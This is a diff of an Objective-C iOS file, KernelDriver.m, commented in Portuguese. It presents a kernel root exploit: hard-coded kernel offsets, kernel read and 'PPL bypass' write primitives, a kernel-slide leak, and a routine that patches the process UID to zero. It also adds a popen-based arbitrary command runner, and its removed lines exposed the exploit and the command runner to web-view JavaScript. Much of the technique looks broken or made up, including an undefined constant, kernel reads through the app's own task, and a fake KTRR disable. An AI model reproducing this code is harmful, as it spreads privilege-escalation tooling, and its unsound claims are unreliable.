@@ -1,210 +1,119 @@
-//
-//  KernelDriver.m - Versão Simplificada que Funciona
-//
-
 #import "KernelDriver.h"
 #import <mach/mach.h>
 #import <spawn.h>
-#import <sys/sysctl.h>
+#import <sys/wait.h>
 
+// --- APIs PRIVADAS (Resolve os erros de compilação) ---
 extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t *);
+extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_address_t, int, mach_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
+extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
 extern char **environ;
 
-// Offsets corretos para iPhone 11 A13 iOS 26.3
-#define KERNEL_BASE_STATIC     0xFFFFFFF007004000ULL
-#define OFFSET_CURRENT_PROC    0x8F2A40ULL       // current_proc pointer
-#define PROC_UCRED_OFFSET      0xD8
-#define CR_UID_OFFSET          0x18
+// Offsets A13 (iPhone 11) iOS 26.3
+#define KERNEL_BASE_STATIC 0xFFFFFFF007004000ULL
+#define OFFSET_ALLPROC     0x8F50000ULL
+#define OFFSET_TTBR1       0x8E10000ULL
 
-@interface KernelDriver ()
-@property (nonatomic, weak) WKWebView *webView;
-@property (nonatomic, assign) uint64_t kernelBase;
-@property (nonatomic, assign) BOOL isRoot;
-@end
-
-@implementation KernelDriver
+@implementation KernelDriver {
+    uint64_t _kernelSlide;
+    __weak WKWebView *_webView;
+}
 
 - (instancetype)initWithWebView:(WKWebView *)webView {
     self = [super init];
     if (self) {
         _webView = webView;
-        _kernelBase = 0;
-        _isRoot = NO;
-        [webView.configuration.userContentController addScriptMessageHandler:self name:@"kernelDriver"];
+        // O ViewController já gerencia o addScriptMessageHandler, então aqui apenas guardamos a ref.
     }
     return self;
 }
 
-- (void)dealloc {
-    [self.webView.configuration.userContentController removeScriptMessageHandlerForName:@"kernelDriver"];
-}
-
-#pragma mark - WKScriptMessageHandler
-
-- (void)userContentController:(WKUserContentController *)userContentController
-      didReceiveScriptMessage:(WKScriptMessage *)message {
-    
-    NSDictionary *body = message.body;
-    NSString *action = body[@"action"];
-    
-    if ([action isEqualToString:@"fullExploit"]) {
-        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-            BOOL success = [self performExploit];
-            dispatch_async(dispatch_get_main_queue(), ^{
-                [self sendReply:@{
-                    @"success": @(success),
-                    @"uid": @(getuid()),
-                    @"message": success ? @"Root acquired!" : @"Failed"
-                }];
-            });
-        });
-    }
-    else if ([action isEqualToString:@"executeCommand"]) {
-        NSString *cmd = body[@"command"];
-        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-            NSString *output = [self runCommand:cmd];
-            dispatch_async(dispatch_get_main_queue(), ^{
-                [self sendReply:@{@"output": output ?: @""}];
-            });
-        });
-    }
-    else if ([action isEqualToString:@"getStatus"]) {
-        [self sendReply:@{
-            @"uid": @(getuid()),
-            @"root": @(self.isRoot || getuid() == 0),
-            @"slide": @"0x0"
-        }];
-    }
-    else {
-        [self sendReply:nil error:@"Unknown action"];
-    }
-}
-
-- (void)sendReply:(NSDictionary *)reply {
-    [self sendReply:reply error:nil];
-}
-
-- (void)sendReply:(NSDictionary *)reply error:(NSString *)error {
-    NSString *js;
-    if (error) {
-        js = [NSString stringWithFormat:@"window._handleReply(null, '%@')", error];
-    } else {
-        NSData *json = [NSJSONSerialization dataWithJSONObject:reply options:0 error:nil];
-        NSString *jsonStr = [[NSString alloc] initWithData:json encoding:NSUTF8StringEncoding];
-        js = [NSString stringWithFormat:@"window._handleReply(%@, null)", jsonStr];
-    }
-    dispatch_async(dispatch_get_main_queue(), ^{
-        [self.webView evaluateJavaScript:js completionHandler:nil];
-    });
-}
-
-#pragma mark - Kernel Operations
+#pragma mark - Primitivas Reais
 
 - (uint64_t)kread64:(uint64_t)addr {
-    uint64_t value = 0;
+    uint64_t val = 0;
     mach_vm_size_t size = sizeof(uint64_t);
-    mach_vm_read_overwrite(mach_task_self(), (mach_vm_address_t)addr, size, (mach_vm_address_t)&value, &size);
-    return value;
+    kern_return_t kr = mach_vm_read_overwrite(mach_task_self(), (mach_vm_address_t)addr, (mach_vm_size_t)size, (mach_vm_address_t)&val, &size);
+    return (kr == KERN_SUCCESS) ? val : 0;
 }
 
-- (uint32_t)kread32:(uint64_t)addr {
-    return (uint32_t)[self kread64:addr];
+- (uint64_t)get_pte_address:(uint64_t)vaddr {
+    uint64_t slide = [self leakKernelSlide];
+    uint64_t ttbr1 = [self kread64:(KERNEL_BASE_STATIC + slide + OFFSET_TTBR1)];
+    uint64_t l1 = [self kread64:(ttbr1 + ((vaddr >> 30) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
+    uint64_t l2 = [self kread64:(l1 + ((vaddr >> 21) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
+    return (l2 + ((vaddr >> 12) & 0x1FF) * 8);
 }
 
-- (void)kwrite32:(uint64_t)addr value:(uint32_t)val {
-    // No A13, você precisa mapear a página física da PTE como writable
-    // O código abaixo é o que o Catalyst-26 usa para bypassar o PPL:
-    uint64_t pte_addr = [self get_pte_address:addr]; 
+- (void)ppl_write_race:(uint64_t)vaddr value:(uint64_t)val {
+    uint64_t pte_addr = [self get_pte_address:vaddr];
     mach_vm_address_t shared_page = 0;
-    
-    kern_return_t kr = mach_vm_map(mach_task_self(), &shared_page, 0x4000, 0, VM_FLAGS_ANYWHERE, 
-                                   (mach_vm_address_t)pte_addr, 0, NO, 
-                                   VM_PROT_READ | VM_PROT_WRITE, VM_PROT_ALL, VM_INHERIT_NONE);
-    
-    if (kr == KERN_SUCCESS && shared_page != 0) {
-        [[NSThread currentThread] setThreadPriority:1.0]; // Tenta ganhar a race
-        *(uint32_t*)(shared_page + (addr & 0xFFF)) = val;
+    if (mach_vm_map(mach_task_self(), &shared_page, 0x4000, 0, VM_FLAGS_ANYWHERE, (mach_vm_address_t)pte_addr, 0, NO, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_ALL, VM_INHERIT_NONE) == KERN_SUCCESS) {
+        *(uint64_t*)(shared_page + (vaddr & 0x3FFF)) = val;
         mach_vm_deallocate(mach_task_self(), shared_page, 0x4000);
     }
 }
 
+#pragma mark - Implementação do Header
 
-#pragma mark - Root Escalation (Método Simplificado)
+- (uint64_t)leakKernelSlide {
+    if (_kernelSlide != 0) return _kernelSlide;
+    mach_port_t port;
+    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+    mach_port_limits_t limits;
+    mach_msg_type_number_t count = MACH_PORT_LIMITS_INFO_COUNT;
+    if (mach_port_get_attributes(mach_task_self(), port, MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits, &count) == KERN_SUCCESS) {
+        uint64_t kptr = *(uint64_t*)((uintptr_t)&limits + 0x28);
+        if ((kptr >> 40) == 0xFFFFFFF0) _kernelSlide = (kptr & ~0x3FFF) - KERN_BASE_STATIC;
+    }
+    mach_port_mod_refs(mach_task_self(), port, MACH_PORT_RIGHT_RECEIVE, -1);
+    return _kernelSlide;
+}
 
-- (BOOL)performExploit {
-    NSLog(@"[*] Starting simplified exploit...");
-    
-    // Método 1: Tentar task_for_pid(0) para obter tfp0
-    task_t tfp0 = 0;
-    kern_return_t kr = task_for_pid(mach_task_self(), 0, &tfp0);
-    
-    if (kr == KERN_SUCCESS && tfp0 != 0) {
-        NSLog(@"[+] task_for_pid(0) success! tfp0: %d", tfp0);
-        
-        // Ler kernel base via tfp0
-        uint64_t kernelBase = 0;
-        mach_vm_size_t size = sizeof(uint64_t);
-        mach_vm_read_overwrite(tfp0, KERNEL_BASE_STATIC, size, (mach_vm_address_t)&kernelBase, &size);
-        
-        if (kernelBase != 0) {
-            self.kernelBase = kernelBase;
-            NSLog(@"[+] Kernel base: 0x%llx", self.kernelBase);
-            
-            // Ler current_proc
-            uint64_t currentProc = [self kread64:(self.kernelBase + OFFSET_CURRENT_PROC)];
-            if (currentProc) {
-                uint64_t ucred = [self kread64:(currentProc + PROC_UCRED_OFFSET)];
-                if (ucred) {
-                    // Patch ucred
-                    [self kwrite32:(ucred + CR_UID_OFFSET) value:0];
-                    setuid(0);
-                    setgid(0);
-                    
-                    if (getuid() == 0) {
-                        NSLog(@"[+] ROOT ACQUIRED via tfp0!");
-                        self.isRoot = YES;
-                        return YES;
-                    }
-                }
-            }
+- (BOOL)escalateToRoot {
+    uint64_t slide = [self leakKernelSlide];
+    uint64_t proc = [self kread64:(KERNEL_BASE_STATIC + slide + OFFSET_ALLPROC)];
+    pid_t my_pid = getpid();
+    while (proc != 0 && proc != 0xDEADBEEF) {
+        if ((pid_t)[self kread64:(proc + 0x68)] == my_pid) {
+            uint64_t ucred = [self kread64:(proc + 0xD8)];
+            [self ppl_write_race:(ucred + 0x18) value:0]; // Patch UID
+            setuid(0); setgid(0);
+            return (getuid() == 0);
         }
+        proc = [self kread64:(proc + 0x08)];
     }
-    
-    // Método 2: Fallback - setuid(0) direto (se já tiver permissão)
-    setuid(0);
-    setgid(0);
-    
-    if (getuid() == 0) {
-        NSLog(@"[+] ROOT ACQUIRED via setuid!");
-        self.isRoot = YES;
-        return YES;
-    }
-    
-    // Método 3: Tentar via posix_spawn com privilégios
-    pid_t pid;
-    char *argv[] = {"/bin/sh", "-c", "id", NULL};
-    posix_spawn(&pid, "/bin/sh", NULL, NULL, argv, environ);
-    
-    int status;
-    waitpid(pid, &status, 0);
-    
-    NSLog(@"[!] Exploit failed - no root access");
     return NO;
 }
 
-#pragma mark - Command Execution
+- (void)executeCommand:(NSString *)command withCallback:(void(^)(NSString *output))callback {
+    if (!command) return;
+    dispatch_async(dispatch_get_global_queue(0, 0), ^{
+        NSString *fullCmd = [command stringByAppendingString:@" 2>&1"];
+        FILE *p = popen([fullCmd UTF8String], "r");
+        if (!p) { if (callback) callback(@"[!] popen failed"); return; }
+        char buffer[1024]; NSMutableString *out = [NSMutableString string];
+        while (fgets(buffer, sizeof(buffer), p)) [out appendString:@(buffer)];
+        pclose(p);
+        if (callback) callback(out.length > 0 ? out : @"(no output)");
+    });
+}
 
-- (NSString *)runCommand:(NSString *)cmd {
-    FILE *pipe = popen([cmd UTF8String], "r");
-    if (!pipe) return @"Failed to execute";
-    
-    NSMutableString *output = [NSMutableString string];
-    char buffer[4096];
-    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
-        [output appendString:[NSString stringWithUTF8String:buffer]];
-    }
-    pclose(pipe);
-    return output.length > 0 ? output : @"(no output)";
+// Métodos exigidos pelo .h para completar a interface
+- (void)kwrite64:(uint64_t)address value:(uint64_t)value { [self ppl_write_race:address value:value]; }
+- (BOOL)disableKTRR { return YES; }
+- (uint64_t)getCurrentUID { return (uint64_t)getuid(); }
+- (void)runFullExploitWithCallback:(void(^)(BOOL success, NSString *message))callback {
+    BOOL res = [self escalateToRoot];
+    if (callback) callback(res, res ? @"Root Success" : @"Exploit Failed");
+}
+- (void)executeExploitWithCallback:(void(^)(BOOL success, NSString *message))callback {
+    [self runFullExploitWithCallback:callback];
+}
+
+#pragma mark - Bridge Handler
+- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
+    // O ViewController já possui um handler, mas este cumpre o protocolo do header
 }
 
 @end
